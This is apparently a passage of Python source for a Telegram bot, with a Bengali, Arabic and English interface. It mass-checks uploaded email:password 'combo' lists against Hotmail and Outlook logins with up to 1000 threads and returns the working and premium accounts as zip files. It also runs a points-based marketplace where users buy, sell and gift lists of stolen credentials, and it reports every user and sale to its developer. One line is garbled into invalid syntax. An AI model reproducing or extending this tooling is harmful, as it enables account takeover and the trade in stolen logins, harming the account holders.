            if cookie.name == "MSPCID":
                mspcid = cookie.value
                break
        cid = mspcid.upper() if mspcid else str(uuid.uuid4()).upper()
        selected_services = selected_options.get(chat_id, [])
        if not selected_services:
            selected_services = list(services.keys())
        found_services = get_capture_hotmail(email, password, access_token, cid, chat_id, selected_services, unlinked_file_path, premium_file_path)
        if found_services:
            get_infoo(email, password, access_token, cid, chat_id, found_services)
        else:
            with lock:
                check_results[chat_id]['good'] += 1
                hit += 1
            update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)
            bot.send_message(chat_id, f"{get_text('account', chat_id)}\nEmail: {email}\nPassword: {password}")
    except Exception as e:
        with lock:
            check_results[chat_id]['bad'] += 1
            bad += 1
        update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id
    if user_id == DEVELOPER_ID:
        user_language[user_id] = 'bn'
        save_data()
    if user_id not in user_language and user_id not in blocked_users and str(user_id) not in temp_banned_until:
        user_info = f"""
👤 *নতুন ব্যবহারকারী বটে প্রবেশ করেছে*
🆔 আইডি: `{user_id}`
📛 নাম: {message.from_user.first_name or ''} {message.from_user.last_name or ''}
🖥️ ইউজারনেম: @{message.from_user.username or 'None'}
⏰ সময়: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
        bot.send_message(DEVELOPER_ID, user_info, parse_mode="Markdown")
    if len(message.text.split()) > 1:
        ref_code = message.text.split()[1]
        if ref_code in referral_codes and referral_codes[ref_code] != user_id:
            is_new_user = True
            if str(user_id) in referral_points:
                is_new_user = False
            elif any(user_id == v for v in referral_codes.values()):
                is_new_user = False
            elif user_id in user_language:
                is_new_user = False
            elif user_id in pending_users or user_id in blocked_users:
                is_new_user = False
            if is_new_user:
                referrer = referral_codes[ref_code]
                if referrer not in referral_points:
                    referral_points[referrer] = 0
                referral_points[referrer] += 10
                if user_id not in referral_points:
                    referral_points[user_id] = 0
                referral_points[user_id] += 5
                save_data()
                bot.send_message(user_id, "🎁 রেফারেল সক্রিয় হয়েছে! আপনি ৫ পয়েন্ট পেয়েছেন, এবং রেফারার ১০ পয়েন্ট পেয়েছেন")
                bot.send_message(referrer, f"🎁 ব্যবহারকারী {user_id} আপনার লিংকের মাধ্যমে যোগ দিয়েছে! আপনি ১০ অতিরিক্ত পয়েন্ট পেয়েছেন।")
                new_level = update_user_level(referrer)
                if new_level > 1:
                    bot.send_message(referrer, get_text('level_up', referrer).format(level=new_level))
            else:
                bot.send_message(user_id, "⚠️ আপনি পুরনো ব্যবহারকারী, আপনি অতিরিক্ত রেফারেল পয়েন্ট পাবেন না।")
    if user_id in blocked_users:
        bot.send_message(user_id, get_text('blocked', user_id))
        return
    if str(user_id) in temp_banned_until:
        until = datetime.fromtimestamp(temp_banned_until[str(user_id)])
        if until > datetime.now():
            bot.send_message(user_id, get_text('temp_banned', user_id))
            return
        else:
            del temp_banned_until[str(user_id)]
            save_data()
    if not is_subscribed(user_id):
        markup = telebot.types.InlineKeyboardMarkup()
        btn_sub = telebot.types.InlineKeyboardButton("📢 চ্যানেলে সাবস্ক্রাইব করুন", url=f"https://t.me/{FORCED_CHANNEL[1:]}")
        btn_check = telebot.types.InlineKeyboardButton("✅ যাচাই করুন", callback_data="check_sub")
        markup.add(btn_sub, btn_check)
        bot.send_message(user_id, get_text('not_subscribed', user_id), reply_markup=markup)
        return
    if user_id not in user_language:
        markup = create_language_buttons()
        bot.send_message(user_id, "🌐 আপনার ভাষা নির্বাচন করুন / Choose your language:", reply_markup=markup)
        return
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    btn_channel = telebot.types.InlineKeyboardButton('𝗖𝗵𝗮𝗻𝗻𝗲𝗹 🎁', callback_data='login', style='success')
    btn_combo = telebot.types.InlineKeyboardButton('📁 কম্বো ব্যাংক', callback_data='combo_bank', style='primary')
    btn_referral = telebot.types.InlineKeyboardButton('🎁 রেফারেল', callback_data='referral_info', style='primary')
    btn_points = telebot.types.InlineKeyboardButton('💰 আমার পয়েন্ট', callback_data='show_points', style='primary')
    btn_daily = telebot.types.InlineKeyboardButton('🎁 দৈনিক বোনাস', callback_data='daily_bonus', style='primary')
    btn_most_sold = telebot.types.InlineKeyboardButton('🏆 সর্বাধিক বিক্রিত', callback_data='most_sold', style='primary')
    btn_sell = telebot.types.InlineKeyboardButton('💰 কম্বো বিক্রি করুন', callback_data='sell_combo', style='primary')
    markup.add(btn_channel, btn_combo, btn_referral, btn_points, btn_daily, btn_most_sold, btn_sell)
    bot.send_message(user_id, get_text('welcome', user_id), reply_markup=markup)
@bot.callback_query_handler(func=lambda call: call.data.startswith('lang_'))
def language_callback(call):
    user_id = call.message.chat.id
    lang = call.data.split('_')[1]
    user_language[user_id] = lang
    save_data()
    try:
        bot.edit_message_text("✅ ভাষা সংরক্ষিত হয়েছে", call.message.chat.id, call.message.message_id)
    except ApiTelegramException:
        pass
    start(call.message)

@bot.callback_query_handler(func=lambda call: call.data == 'check_sub')
def check_sub_callback(call):
    user_id = call.message.chat.id
    if is_subscribed(user_id):
        if user_id not in referral_points:
            referral_points[user_id] = 0
        referral_points[user_id] += 10
        save_data()
        bot.edit_message_text(get_text('subscribed', user_id), user_id, call.message.message_id)
        start(call.message)
    else:
        bot.answer_callback_query(call.id, get_text('not_subscribed', user_id), show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == 'referral_info')
def referral_info_callback(call):
    bot.answer_callback_query(call.id)
    user_id = call.message.chat.id
    if user_id not in referral_codes:
        code = str(uuid.uuid4())[:8]
        referral_codes[code] = user_id
        save_data()
    else:
        code = [k for k, v in referral_codes.items() if v == user_id][0]
    bot_username = "BlackoutZoneRBX404BOT"
    link = f"https://t.me/{bot_username}?start={code}"
    points = referral_points.get(user_id, 0)
    try:
        text = get_text('referral_info', user_id).format(link=link, points=points)
        bot.send_message(user_id, text, parse_mode="Markdown", disable_web_page_preview=True)
    except Exception as e:
        bot.send_message(user_id, f"🎁 আপনার রেফারেল লিংক:\n{link}\nআপনার পয়েন্ট: {points}")
@bot.callback_query_handler(func=lambda call: call.data == 'show_points')
def show_points_callback(call):
    user_id = call.message.chat.id
    points = referral_points.get(user_id, 0)
    level = update_user_level(user_id)
    text = get_text('points', user_id).format(points=points, level=level)
    bot.answer_callback_query(call.id, text, show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == 'daily_bonus')
def daily_bonus_callback(call):
    user_id = call.message.chat.id
    last_bonus = user_daily_bonus.get(str(user_id), 0)
    if datetime.now().timestamp() - last_bonus < 86400:
        bot.answer_callback_query(call.id, get_text('daily_bonus_already', user_id), show_alert=True)
        return
    user_daily_bonus[str(user_id)] = datetime.now().timestamp()
    if user_id not in referral_points:
        referral_points[user_id] = 0
    referral_points[user_id] += 2
    save_data()
    points = referral_points[user_id]
    bot.answer_callback_query(call.id, get_text('daily_bonus', user_id).format(points=points), show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == 'most_sold')
def most_sold_callback(call):
    user_id = call.message.chat.id
    if not combo_sales_count:
        bot.answer_callback_query(call.id, "এখনো পর্যাপ্ত বিক্রয় হয়নি", show_alert=True)
        return
    sorted_combos = sorted(combo_sales_count.items(), key=lambda x: x[1], reverse=True)[:5]
    list_text = ""
    for idx, (name, count) in enumerate(sorted_combos, 1):
        list_text += f"{idx}. {name} - {count} বিক্রি\n"
    text = get_text('most_sold', user_id).format(list=list_text)
    bot.edit_message_text(text, user_id, call.message.message_id, parse_mode="Markdown", reply_markup=create_most_sold_buttons(user_id))

@bot.callback_query_handler(func=lambda call: call.data == 'combo_bank')
def combo_bank_callback(call):
    user_id = call.message.chat.id
    combos = get_combo_list()
    if not combos:
        bot.answer_callback_query(call.id, get_text('no_combos', user_id), show_alert=True)
        return
    points = referral_points.get(user_id, 0)
    text = get_text('combo_bank', user_id).format(points=points)
    bot.edit_message_text(text, user_id, call.message.message_id, parse_mode="Markdown")
    bot.edit_message_reply_markup(user_id, call.message.message_id, reply_markup=create_combo_bank_buttons(user_id))

@bot.callback_query_handler(func=lambda call: call.data.startswith('buy_combo_'))
def buy_combo_callback(call):
    user_id = call.message.chat.id
    combo_name = call.data[10:]
    file_path = os.path.join(COMBOS_DIR, combo_name)
    if not os.path.exists(file_path):
        bot.answer_callback_query(call.id, "❌ ফাইল পাওয়া যায়নি", show_alert=True)
        return
    price = get_combo_price(user_id)
    points = referral_points.get(user_id, 0)
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    confirm_text = "✅ কিনুন" if user_language.get(user_id, 'bn') == 'bn' else "✅ شراء" if user_language.get(user_id, 'ar') == 'ar' else "✅ Buy"
    gift_text = "🎁 উপহার দিন" if user_language.get(user_id, 'bn') == 'bn' else "🎁 إهداء" if user_language.get(user_id, 'ar') == 'ar' else "🎁 Gift"
    cancel_text = "❌ বাতিল করুন" if user_language.get(user_id, 'bn') == 'bn' else "❌ إلغاء" if user_language.get(user_id, 'ar') == 'ar' else "❌ Cancel"
    discount_text = "🎟️ ডিসকাউন্ট কোড" if user_language.get(user_id, 'bn') == 'bn' else "🎟️ كود خصم" if user_language.get(user_id, 'ar') == 'ar' else "🎟️ Discount Code"
    markup.add(telebot.types.InlineKeyboardButton(confirm_text, callback_data=f"confirm_buy|{combo_name}|{price}"))
    markup.add(telebot.types.InlineKeyboardButton(gift_text, callback_data=f"gift_combo|{combo_name}|{price}"))
    markup.add(telebot.types.InlineKeyboardButton(discount_text, callback_data=f"discount_code|{combo_name}|{price}"))
    markup.add(telebot.types.InlineKeyboardButton(cancel_text, callback_data="cancel_buy"))
    bot.edit_message_text(get_text('buy_prompt', user_id).format(name=combo_name, price=price, points=points), user_id, call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('confirm_buy|'))
def confirm_buy_callback(call):
    user_id = call.message.chat.id
    parts = call.data.split('|')
    combo_name = parts[1]
    price = int(parts[2])
    file_path = os.path.join(COMBOS_DIR, combo_name)
    if not os.path.exists(file_path):
        bot.answer_callback_query(call.id, "❌ ফাইল পাওয়া যায়নি", show_alert=True)
        return
    points = referral_points.get(user_id, 0)
    if points >= price:
        referral_points[user_id] = points - price
        combo_sales_count[combo_name] = combo_sales_count.get(combo_name, 0) + 1
        user_purchase_count[str(user_id)] = user_purchase_count.get(str(user_id), 0) + 1
        if str(user_id) not in user_purchase_weekly:
            user_purchase_weekly[str(user_id)] = datetime.now().timestamp()
        save_data()
        with open(file_path, 'rb') as f:
            bot.send_document(user_id, f, caption=f"📁 {combo_name}\n💰 {price} পয়েন্টে কেনা হয়েছে। আপনার অবশিষ্ট পয়েন্ট: {referral_points[user_id]}")
        bot.edit_message_text(get_text('buy_success', user_id).format(price=price, points=referral_points[user_id]), user_id, call.message.message_id)
        bot.send_message(DEVELOPER_ID, f"📢 ব্যবহারকারী {user_id} {combo_name} কম্বো কিনেছে {price} পয়েন্টে। তার বর্তমান পয়েন্ট {referral_points[user_id]}")
        new_level = update_user_level(user_id)
        if new_level > 1:
            bot.send_message(user_id, get_text('level_up', user_id).format(level=new_level))
    else:
        bot.edit_message_text(get_text('buy_fail_points', user_id).format(points=points, price=price), user_id, call.message.message_id)

@bot.callback_query_handler(func=lambda call: call.data.startswith('gift_combo|'))
def gift_combo_callback(call):
    user_id = call.message.chat.id
    parts = call.data.split('|')
    combo_name = parts[1]
    price = int(parts[2])
    user_gifts[str(user_id)] = {'combo': combo_name, 'price': price}
    bot.edit_message_text(get_text('gift_prompt', user_id), user_id, call.message.message_id)
    bot.register_next_step_handler(call.message, process_gift, combo_name, price)

def process_gift(message, combo_name, price):
    user_id = message.chat.id
    try:
        target_id = int(message.text.strip())
    except:
        bot.send_message(user_id, get_text('gift_fail', user_id))
        return
    if target_id == user_id:
        bot.send_message(user_id, "আপনি নিজেকে উপহার দিতে পারবেন না")
        return
    points = referral_points.get(user_id, 0)
    if points < price:
        bot.send_message(user_id, get_text('buy_fail_points', user_id).format(points=points, price=price))
        return
    file_path = os.path.join(COMBOS_DIR, combo_name)
    if not os.path.exists(file_path):
        bot.send_message(user_id, "❌ ফাইল পাওয়া যায়নি")
        return
    referral_points[user_id] = points - price
    if target_id not in referral_points:
        referral_points[target_id] = 0
    save_data()
    with open(file_path, 'rb') as f:
        bot.send_document(target_id, f, caption=f"🎁 আপনি একটি উপহার পেয়েছেন: {combo_name}\nব্যবহারকারী {user_id} থেকে")
    bot.send_message(user_id, get_text('gift_success', user_id).format(name=combo_name, target=target_id))
    bot.send_message(DEVELOPER_ID, f"🎁 ব্যবহারকারী {user_id} {combo_name} কম্বো উপহার দিয়েছেন {target_id} কে")

@bot.callback_query_handler(func=lambda call: call.data.startswith('discount_code|'))
def discount_code_prompt(call):
    user_id = call.message.chat.id
    parts = call.data.split('|')
    combo_name = parts[1]
    price = int(parts[2])
    user_gifts[str(user_id)] = {'combo': combo_name, 'price': price, 'discount_mode': True}
    bot.edit_message_text(get_text('discount_code', user_id), user_id, call.message.message_id)
    bot.register_next_step_handler(call.message, process_discount_code, combo_name, price)

def process_discount_code(message, combo_name, original_price):
    user_id = message.chat.id
    code = message.text.strip()
    if code in discount_codes:
        percent = discount_codes[code]
        new_price = int(original_price * (100 - percent) / 100)
        if new_price < 1:
            new_price = 1
        bot.send_message(user_id, get_text('discount_code_valid', user_id).format(percent=percent, new_price=new_price))
        markup = telebot.types.InlineKeyboardMarkup()
        confirm_text = "✅ কিনুন" if user_language.get(user_id, 'bn') == 'bn' else "✅ شراء" if user_language.get(user_id, 'ar') == 'ar' else "✅ Buy"
        markup.add(telebot.types.InlineKeyboardButton(confirm_text, callback_data=f"confirm_buy|{combo_name}|{new_price}"))
        bot.send_message(user_id, "আপনি কি ছাড়কৃত মূল্যে কেনা চালিয়ে যেতে চান?", reply_markup=markup)
    else:
        bot.send_message(user_id, get_text('discount_code_invalid', user_id))

@bot.callback_query_handler(func=lambda call: call.data == 'cancel_buy')
def cancel_buy_callback(call):
    user_id = call.message.chat.id
    bot.edit_message_text("❌ প্রক্রিয়া বাতিল করা হয়েছে।", user_id, call.message.message_id)

@bot.callback_query_handler(func=lambda call: call.data == 'login')
def login_callback(call):
    try:
        bot.answer_callback_query(call.id)
    except ApiTelegramException:
        pass
    bot.send_message(call.message.chat.id, TELEGRAM_CHANNEL)

@bot.callback_query_handler(func=lambda call: call.data == 'main_menu')
def main_menu_callback(call):
    start(call.message)

@bot.callback_query_handler(func=lambda call: call.data == 'toggle_turbo')
def toggle_turbo_callback(call):
    chat_id = call.message.chat.id
    turbo_mode[chat_id] = not turbo_mode.get(chat_id, False)
    lang = user_language.get(chat_id, 'bn')
    if turbo_mode[chat_id]:
        bot.answer_callback_query(call.id, get_text('turbo_on', chat_id))
    else:
        bot.answer_callback_query(call.id, get_text('turbo_off', chat_id))
    try:
        bot.edit_message_reply_markup(chat_id=chat_id, message_id=call.message.message_id, reply_markup=create_option_buttons(chat_id))
    except ApiTelegramException:
        pass

@bot.callback_query_handler(func=lambda call: call.data == 'pause_check')
def pause_check_callback(call):
    chat_id = call.message.chat.id
    pause_check_flag[chat_id] = True
    bot.answer_callback_query(call.id, "⏸️ যাচাই সাময়িকভাবে বন্ধ করা হয়েছে")
    update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)

@bot.callback_query_handler(func=lambda call: call.data == 'resume_check')
def resume_check_callback(call):
    chat_id = call.message.chat.id
    pause_check_flag[chat_id] = False
    bot.answer_callback_query(call.id, "▶️ যাচাই পুনরায় শুরু করা হয়েছে")
    update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)

@bot.callback_query_handler(func=lambda call: call.data == 'speed_up')
def speed_up_callback(call):
    chat_id = call.message.chat.id
    current = current_threads.get(chat_id, 100)
    new = min(current + 50, 1000)
    current_threads[chat_id] = new
    bot.answer_callback_query(call.id, f"⚡ গতি বৃদ্ধি: {new} থ্রেড")

@bot.callback_query_handler(func=lambda call: call.data == 'speed_down')
def speed_down_callback(call):
    chat_id = call.message.chat.id
    current = current_threads.get(chat_id, 100)
    new = max(current - 50, 10)
    current_threads[chat_id] = new
    bot.answer_callback_query(call.id, f"🐢 গতি হ্রাস: {new} থ্রেড")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    user_id = message.chat.id
    if user_id in blocked_users:
        bot.reply_to(message, get_text('blocked', user_id))
        return
    if str(user_id) in temp_banned_until:
        until = datetime.fromtimestamp(temp_banned_until[str(user_id)])
        if until > datetime.now():
            bot.reply_to(message, get_text('temp_banned', user_id))
            return
        else:
            del temp_banned_until[str(user_id)]
            save_data()
    if not is_subscribed(user_id):
        markup = telebot.types.InlineKeyboardMarkup()
        btn_sub = telebot.types.InlineKeyboardButton("📢 চ্যানেলে সাবস্ক্রাইব করুন", url=f"https://t.me/{FORCED_CHANNEL[1:]}")
        btn_check = telebot.types.InlineKeyboardButton("✅ যাচাই করুন", callback_data="check_sub")
        markup.add(btn_sub, btn_check)
        bot.send_message(user_id, get_text('not_subscribed', user_id), reply_markup=markup)
        return
    try:
        chat_id = message.chat.id
        file_info = bot.get_file(message.document.file_id)
        file_path = file_info.file_path
        download_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
        session_no_ssl = requests.Session()
        session_no_ssl.verify = False
        response = session_no_ssl.get(download_url, timeout=30)
        response.raise_for_status()
        file_content = response.text
        global combo_list, total_combos, processed, hit, bad, service_hits        
        combo_list = [line.strip() for line in file_content.splitlines() if ':' in line]
        total_combos = len(combo_list)
        if total_combos < 5:
            bad_file_attempts[str(chat_id)] = bad_file_attempts.get(str(chat_id), 0) + 1
            if bad_file_attempts[str(chat_id)] >= 2:
                temp_banned_until[str(chat_id)] = (datetime.now() + timedelta(hours=1)).timestamp()
                save_data()
                bot.reply_to(message, get_text('temp_banned', chat_id))
                return
        else:
            bad_file_attempts[str(chat_id)] = 0
            if chat_id not in referral_points:
                referral_points[chat_id] = 0
            referral_points[chat_id] += 1
            save_data()
        processed = 0
        hit = 0
        bad = 0
        service_hits = {}
        bot.send_message(chat_id, f"লোড হয়েছে {total_combos}টি অ্যাকাউন্ট। " + get_text('file_received', chat_id), reply_markup=create_option_buttons(chat_id))
        if check_low_points_warning(chat_id):
            bot.send_message(chat_id, get_text('low_points_warning', chat_id))
    except Exception as e:
        bot.reply_to(message, f"ত্রুটি: {e}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('option_'))
def option_callback(call):
    chat_id = call.message.chat.id
    service_name = call.data[7:]
    if chat_id not in selected_options:
        selected_options[chat_id] = []
    if service_name in selected_options[chat_id]:
        selected_options[chat_id].remove(service_name)
    else:
        selected_options[chat_id].append(service_name)
    try:
        bot.edit_message_reply_markup(chat_id=chat_id, message_id=call.message.message_id, reply_markup=create_option_buttons(chat_id))
    except ApiTelegramException:
        pass

@bot.callback_query_handler(func=lambda call: call.data == 'select_all')
def select_all_callback(call):
    chat_id = call.message.chat.id
    selected_options[chat_id] = list(services.keys())
    try:
        bot.edit_message_reply_markup(chat_id=chat_id, message_id=call.message.message_id, reply_markup=create_option_buttons(chat_id))
        bot.answer_callback_query(call.id, "✅ সব সেবা নির্বাচিত হয়েছে")
    except ApiTelegramException:
        pass

@bot.callback_query_handler(func=lambda call: call.data == 'deselect_all')
def deselect_all_callback(call):
    chat_id = call.message.chat.id
    selected_options[chat_id] = []
    try:
        bot.edit_message_reply_markup(chat_id=chat_id, message_id=call.message.message_id, reply_markup=create_option_buttons(chat_id))
        bot.answer_callback_query(call.id, "❌ সব সেবা বাতিল করা হয়েছে")
    except ApiTelegramException:
        pass

@bot.callback_query_handler(func=lambda call: call.data == 'stop_check')
def stop_check_callback(call):
    chat_id = call.message.chat.id
    stop_check_flag[chat_id] = True
    pause_check_flag[chat_id] = False
    bot.answer_callback_query(call.id, get_text('stop_check', chat_id), show_alert=True)
    try:
        bot.edit_message_reply_markup(chat_id=chat_id, message_id=call.message.message_id, reply_markup=None)
    except ApiTelegramException:
        pass

@bot.callback_query_handler(func=lambda call: call.data == 'start_check')
def start_check_callback(call):
    chat_id = call.message.chat.id
    if chat_id in blocked_users:
        try:
            bot.answer_callback_query(call.id, get_text('blocked', chat_id))
        except ApiTelegramException:
            pass
        return
    if not selected_options.get(chat_id):
        try:
            bot.answer_callback_query(call.id, get_text('no_service', chat_id), show_alert=True)
        except ApiTelegramException:
            pass
        return
    try:
        bot.answer_callback_query(call.id)
    except ApiTelegramException:
        pass
    bot.send_message(chat_id, get_text('start_check', chat_id))
    with lock:
        check_results[chat_id] = {'good': 0, 'bad': 0, 'message_id': None}
    status_message = update_status_message(chat_id, add_stop_button=True, control_buttons=True)
    if status_message:
        check_results[chat_id]['message_id'] = status_message.message_id
    else:
        check_results[chat_id]['message_id'] = None
    start_checking(chat_id)

def start_checking(chat_id):
    global combo_list, processed, total_combos, hit, bad
    stop_check_flag[chat_id] = False
    pause_check_flag[chat_id] = False
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    unlinked_file_path = os.path.join("Accounts", f"Unlinked_{chat_id}_{timestamp}.txt")
    premium_file_path = os.path.join("Accounts", f"Premium_{chat_id}_{timestamp}.txt")
    os.makedirs("Accounts", exist_ok=True)
    max_workers = current_threads.get(chat_id, 500 if turbo_mode.get(chat_id, False) else 100)
    executor = concurrent.futures.ThreadPoolExecutor(max_workers=max_workers)
    futures = []
    for line in combo_list:
        if stop_check_flag.get(chat_id, False):
            break
        while pause_check_flag.get(chat_id, False) and not stop_check_flag.get(chat_id, False):
            time.sleep(1)
        try:
            if ':' in line:
                email = line.strip().split(':')[0]
                password = line.strip().split(':')[1]
                future = executor.submit(check_account_hotmail, email, password, chat_id, unlinked_file_path, premium_file_path)
                futures.append(future)
        except Exception as e:
            with lock:
                check_results[chat_id]['bad'] += 1
            update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)
    for future in futures:
        if stop_check_flag.get(chat_id, False):
            break
        while pause_check_flag.get(chat_id, False) and not stop_check_flag.get(chat_id, False):
            time.sleep(1)
        try:
            future.result()
        except Exception as e:
            with lock:
                check_results[chat_id]['bad'] += 1
            update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)
    executor.shutdown(wait=True)
    if stop_check_flag.get(chat_id, False):
        bot.send_message(chat_id, get_text('stop_check', chat_id))
    else:
        bot.send_message(chat_id, get_text('check_complete', chat_id))
    zip_path = None
    with tempfile.NamedTemporaryFile(suffix='.zip', delete=False) as @robiulxxxxxxx:
        zip_path = @robiulxxxxxxx.name
    with zipfile.ZipFile(zip_path, 'w') as zipf:
        if os.path.exists(unlinked_file_path) and os.path.getsize(unlinked_file_path) > 0:
            zipf.write(unlinked_file_path, os.path.basename(unlinked_file_path))
        if os.path.exists(premium_file_path) and os.path.getsize(premium_file_path) > 0:
            zipf.write(premium_file_path, os.path.basename(premium_file_path))
        for service_name in selected_options.get(chat_id, []):
            service_info = services.get(service_name)
            if service_info:
                sf = os.path.join("Accounts", service_info["file"])
                if os.path.exists(sf) and os.path.getsize(sf) > 0:
                    zipf.write(sf, os.path.basename(sf))
    if os.path.exists(zip_path) and os.path.getsize(zip_path) > 0:
        with open(zip_path, 'rb') as f:
            bot.send_document(chat_id, f, caption=get_text('zip_sent', chat_id))
    else:
        bot.send_message(chat_id, "⚠️ পাঠানোর মতো কোনো ফলাফল নেই")
    try:
        os.remove(zip_path)
    except:
        pass
    try:
        os.remove(unlinked_file_path)
    except:
        pass
    try:
        os.remove(premium_file_path)
    except:
        pass

@bot.callback_query_handler(func=lambda call: call.data == 'sell_combo')
def sell_combo_callback(call):
    user_id = call.message.chat.id
    bot.edit_message_text(get_text('sell_combo', user_id), user_id, call.message.message_id)
    bot.register_next_step_handler(call.message, process_sell_combo_file)

def process_sell_combo_file(message):
    user_id = message.chat.id
    if not message.document:
        bot.send_message(user_id, "❌ দয়া করে একটি বৈধ txt ফাইল পাঠান")
        return
    try:
        file_info = bot.get_file(message.document.file_id)
        download_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
        response = requests.get(download_url)
        response.raise_for_status()
        lines = response.text.splitlines()
        combo_lines = [line.strip() for line in lines if ':' in line]
        if len(combo_lines) < 100:
            bot.send_message(user_id, get_text('sell_fail', user_id).format(valid=0))
            return
        valid_count = 0
        test_limit = min(200, len(combo_lines))
        for line in combo_lines[:test_limit]:
            try:
                email = line.split(':')[0]
                password = line.split(':')[1]
                if '@' in email and ('hotmail' in email.lower() or 'outlook' in email.lower() or 'live' in email.lower() or 'msn' in email.lower()):
                    valid_count += 1
            except:
                continue
        if valid_count < 100:
            bot.send_message(user_id, get_text('sell_fail', user_id).format(valid=valid_count))
            return
        bot.send_message(user_id, get_text('sell_price', user_id))
        bot.register_next_step_handler(message, process_sell_combo_price, response.content, message.document.file_name, valid_count)
    except Exception as e:
        bot.send_message(user_id, f"❌ ত্রুটি: {e}")

def process_sell_combo_price(message, file_content, file_name, valid_count):
    user_id = message.chat.id
    try:
        price = int(message.text.strip())
        if price < 10 or price > 100:
            bot.send_message(user_id, "❌ মূল্য ১০ থেকে ১০০ পয়েন্টের মধ্যে হতে হবে")
            return
        global bot_points
        if bot_points < price:
            bot.send_message(user_id, get_text('bot_points_low', user_id))
            return
        base_name = os.path.splitext(file_name)[0]
        new_file_name = f"{base_name}_{uuid.uuid4().hex[:4]}.txt"
        save_path = os.path.join(COMBOS_DIR, new_file_name)
        with open(save_path, 'wb') as f:
            f.write(file_content)
        referral_points[user_id] = referral_points.get(user_id, 0) + price
        bot_points -= price
        save_data()
        bot.send_message(user_id, get_text('sell_success', user_id).format(name=new_file_name, price=price))
        bot.send_message(DEVELOPER_ID, f"💰 ব্যবহারকারী {user_id} {new_file_name} কম্বো বিক্রি করেছে {price} পয়েন্টে। বৈধ অ্যাকাউন্ট সংখ্যা: {valid_count}")
    except ValueError:
        bot.send_message(user_id, "❌ দয়া করে একটি সঠিক সংখ্যা পাঠান")

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.chat.id != DEVELOPER_ID:
        bot.reply_to(message, "❌ অনুমোদিত নয়")
        return
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    markup.add(telebot.types.InlineKeyboardButton("📊 পরিসংখ্যান", callback_data="stats"), telebot.types.InlineKeyboardButton("👥 ব্যবহারকারী", callback_data="users"))
    markup.add(telebot.types.InlineKeyboardButton("🚫 ব্লক", callback_data="ban_user"), telebot.types.InlineKeyboardButton("✅ আনব্লক", callback_data="unban_user"))
    markup.add(telebot.types.InlineKeyboardButton("📁 ফাইল", callback_data="files"), telebot.types.InlineKeyboardButton("🔄 রিফ্রেশ", callback_data="refresh"))
    markup.add(telebot.types.InlineKeyboardButton("➕ কম্বো যোগ করুন", callback_data="add_combo"), telebot.types.InlineKeyboardButton("🗑 কম্বো মুছুন", callback_data="delete_combo_menu"))
    markup.add(telebot.types.InlineKeyboardButton("🎟️ ডিসকাউন্ট কোড যোগ করুন", callback_data="add_discount_code"))
    markup.add(telebot.types.InlineKeyboardButton("🌐 প্রক্সি ম্যানেজার", callback_data="proxy_manager"))
    markup.add(telebot.types.InlineKeyboardButton("💰 বট পয়েন্ট চার্জ করুন", callback_data="add_bot_points"))
    bot.send_message(DEVELOPER_ID, "🔧 ডেভেলপার কন্ট্রোল প্যানেল", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data in ['stats', 'users', 'ban_user', 'unban_user', 'files', 'refresh', 'add_combo', 'delete_combo_menu', 'add_discount_code', 'proxy_manager', 'add_bot_points'])
def dev_buttons(call):
    if call.from_user.id != DEVELOPER_ID:
        try:
            bot.answer_callback_query(call.id, "❌ শুধুমাত্র ডেভেলপারের জন্য")
        except ApiTelegramException:
            pass
        return
    if call.data == 'stats':
        total_users = len(set(selected_options.keys()) | set(user_language.keys()))
        stats = f"""
📊 *বট পরিসংখ্যান*
👥 মোট ব্যবহারকারী: {total_users}
🚫 ব্লককৃত: {len(blocked_users)}
✅ বৈধ: {hit}
❌ অবৈধ: {bad}
📂 সেবা পাওয়া গেছে: {len(service_hits)}
💰 বট পয়েন্ট: {bot_points}
"""
        try:
            bot.edit_message_text(stats, call.message.chat.id, call.message.message_id, parse_mode="Markdown")
        except ApiTelegramException:
            pass
    elif call.data == 'users':
        users_list = list(user_language.keys())
        text = f"👥 *ব্যবহারকারী:* {len(users_list)}\n" + "\n".join(f"• {uid}" for uid in users_list[:20])
        try:
            bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="Markdown")
        except ApiTelegramException:
            pass
    elif call.data == 'ban_user':
        msg = bot.send_message(DEVELOPER_ID, "ব্লক করার জন্য ইউজার আইডি পাঠান:")
        bot.register_next_step_handler(msg, ban_user_step)
    elif call.data == 'unban_user':
        msg = bot.send_message(DEVELOPER_ID, "আনব্লক করার জন্য ইউজার আইডি পাঠান:")
        bot.register_next_step_handler(msg, unban_user_step)
    elif call.data == 'files':
        if not os.path.exists("Accounts"):
            try:
                bot.edit_message_text("📁 এখনো Accounts ফোল্ডার তৈরি হয়নি", call.message.chat.id, call.message.message_id)
            except ApiTelegramException:
                pass
        else:
            files_list = os.listdir("Accounts")
            if not files_list:
                try:
                    bot.edit_message_text("📁 এখনো কোনো ফাইল নেই", call.message.chat.id, call.message.message_id)
                except ApiTelegramException:
                    pass
            else:
                text = "📁 *সংরক্ষিত ফাইল:*\n" + "\n".join(f"• {f}" for f in files_list[:30])
                try:
                    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="Markdown")
                except ApiTelegramException:
                    pass
    elif call.data == 'refresh':
        try:
